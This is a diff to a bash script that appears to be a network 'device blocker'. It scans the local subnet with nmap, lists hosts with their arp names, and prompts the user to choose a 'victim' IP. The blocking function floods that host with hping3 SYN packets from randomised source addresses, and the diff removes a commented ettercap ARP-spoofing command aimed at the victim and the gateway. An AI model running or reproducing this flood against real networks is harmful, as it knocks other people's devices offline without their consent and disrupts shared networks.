@@ -1,5 +1,6 @@
 #!/bin/bash
 
+# FUNCTIONS TO GET DATA
 function getDefaultInterface {
   defaultInterface=$(route | grep '^default' | grep -o '[^ ]*$');
 }
@@ -12,30 +13,32 @@ function getDefaultGateway {
   defaultGateway=$(ip r | grep default | awk '{print $3}')
 }
 
+function getDeviceName {
+  echo $(arp $1 | tail -n +2 | awk '{print $1}')
+}
+
 function getIPAddressesInNetwork {
   printf "\n\nDetecting devices in the network... \n"
   ipAddresses=( $(nmap -n -sn $userIPAddress/24 -oG - | awk '/Up$/{print $2}' | xargs) )
-  //getMACAddressesInNetwork
+  #getMACAddressesInNetwork
 }
 
 function getMACAddressesInNetwork {
   printf "Resolving MAC Addresses... \n"
-  #i=0
-  #macAddresses=()
-  #for ip in "${ipAddresses[@]}"
-  #do
-  #macAddresses+=( $(arping -I $defaultInterface -c1 $ip | grep from | awk '{print $4}') )
-  #  ((i++))
-  #done
   victimIPAddress=""
   victimMACAddress=$(arping -I $defaultInterface -c1 $victimIPAddress | grep from | awk '{print $4}')
 }
 
+
+# FUNCTIONS TO PRINT DATA
 function printIPAddressesInNetwork {
 
+  i=1
   for ip in "${ipAddresses[@]}"
   do
-    echo $ip
+    deviceName=$(getDeviceName "$ip")
+    echo -e " ${RED}[$i] ${WHITE}"$ip"        [ "$deviceName" ]"
+    ((i++))
   done
 
 }
@@ -53,12 +56,7 @@ function removeDeviceFromNetwork {
   openingHeader
 
   printf "${YELLOW}Available devices: \n${WHITE}"
-  i=1
-  for ip in "${ipAddresses[@]}"
-  do
-    echo -e " ${RED}[$i] ${WHITE}"$ip
-    ((i++))
-  done
+  printIPAddressesInNetwork
 
   printf "\n SELECT IP TO BLOCK > \n"
   read -r ipSelectedOption
@@ -70,6 +68,8 @@ function removeDeviceFromNetwork {
 }
 
 
+
+# FUNCTION TO EXECUTE BLOCK
 function blockAfterSelectIP {
   victimIPAddress=${ipAddresses[ipSelectedOption-1]}
   #victimMACAddress=${macAddresses[ipSelectedOption-1]}
@@ -84,5 +84,3 @@ function blockAfterSelectIP {
 
   hping3 -c 10000 -d 120 -S -w 64 -p 80 --flood --rand-source $victimIPAddress > /dev/null
 }
-
-#ettercap -T -q -p -F block.ef -M arp:remote /$victimIPAddress// /$defaultGateway//
